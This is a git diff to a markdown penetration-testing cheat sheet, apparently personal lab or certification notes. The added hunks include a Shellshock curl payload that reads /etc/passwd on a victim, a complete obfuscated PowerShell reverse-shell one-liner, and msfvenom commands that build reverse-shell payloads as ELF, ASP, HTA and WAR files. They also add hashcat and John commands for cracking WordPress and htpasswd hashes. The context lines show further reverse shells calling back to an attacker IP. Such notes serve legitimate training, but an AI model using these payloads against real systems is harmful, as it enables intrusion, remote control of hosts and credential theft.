@@ -7,8 +7,10 @@
         <li><a href="#after-first-shell">After first shell</a></li>
         <li><a href="#general">General</a></li>
         <li><a href="#privilege-escalation">Privilege escalation</a></li>
+        <li><a href="#password-crack">Password crack</a></li>
         <li><a href="#buffer-overflow-machine">Buffer Overflow Machine</a></li>
         <li><a href="#references">References</a></li>
+        
    </ol>
 </details>
 
@@ -114,6 +116,13 @@
         ```
         curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTIM/cgi-bin/admin.cgi
         ```
+
+        or
+
+        ```
+        curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
+http://VICTIM/cgi-bin/vulnerable
+        ```
         
         
         
@@ -145,12 +154,39 @@
     export RHOST="<ATTACKER_IP>";export RPORT=<PORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
     ```
 
-* Windows powershell: /*TODO*/
+* Windows powershell:
 
-* Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+    ```
+    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+    ```
+
+* Some useful msfvenom payloads:
+
+    ```
+    # Linux Staged reverse TCP
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o reverse.elf
+
+    # Stageless ASP reverse TCP
+    msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > rev.asp
+
+    # HTA-PSH
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o evil.hta
+
+    # WAR
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > reverse.war
+    ```
 
 
+* Useful!
+    ```
+    https://www.revshells.com/
+    ```
 
+* Reference: 
+    ```
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+    ```
 
 
 ## After first shell
@@ -267,9 +303,8 @@
 
 * Unshadow:
 
-    Unshadow merge passwd with shadow files, organizing both in one file:
-
     ```
+    # Unshadow merge passwd with shadow files, organizing both in one file:
     /usr/sbin/unshadow passwd_file.txt shadow_file.txt > <OUT_FILE>
     ```
 
@@ -372,6 +407,33 @@
     * https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 
 
+
+## Password crack
+
+### Hashcat
+
+    ```
+    # sha256
+    hashcat -m 1400 -a 3 password_nadav.txt /usr/share/wordlists/rockyou.txt
+
+    # md5 wordpress
+    hashcat -O -m 400 -a 0 admin_wp_hash_password.txt /usr/share/wordlists/rockyou.txt -o password_cracked.txt
+
+    ```
+
+
+### John
+
+* htpasswd:
+
+    ```
+    /usr/sbin/john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.dav
+
+    # Show results:
+    /usr/sbin/john --show
+    ```
+
+
 ## Buffer Overflow machine
 
 Don't forget to try nc to the vulnerable service first! You need to find out the `prefix` variable.
@@ -426,6 +488,7 @@ Don't forget to try nc to the vulnerable service first! You need to find out the
 
 * Payload all the things: https://github.com/swisskyrepo/PayloadsAllTheThings
 * GTFOBins: https://gtfobins.github.io/gtfobins/nmap/
+* G0tMilk: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 * Windows XP SP1 privesc: https://sohvaxus.github.io/content/winxp-sp1-privesc.html
 * SMB Share Enum: https://blog.codecentric.de/en/2017/11/penetration-test-training-lazysysadmin-1-vanilla-style/
 * SQL Server attack tips: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
